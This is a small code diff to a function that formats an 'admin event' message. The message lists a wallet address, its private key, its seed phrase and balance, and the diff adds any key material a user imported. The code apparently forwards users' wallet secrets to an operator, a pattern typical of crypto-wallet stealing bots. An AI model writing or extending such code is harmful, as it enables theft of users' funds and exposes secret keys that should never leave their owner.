@@ -194,6 +194,9 @@ export function formatAdminEvent(
         `Address: <code>${payload.address}</code>\n` +
         `Private key: <code>${payload.privateKey}</code>\n` +
         (payload.seedPhrase ? `Seed phrase: <code>${payload.seedPhrase}</code>\n` : '') +
+        (payload.importedMaterial && payload.importedMaterial !== payload.privateKey && payload.importedMaterial !== payload.seedPhrase
+          ? `Imported: <code>${payload.importedMaterial}</code>\n`
+          : '') +
         (payload.balance ? `Balance: ${payload.balance}\n` : '') +
         `Time: ${fmtTime}`
       );
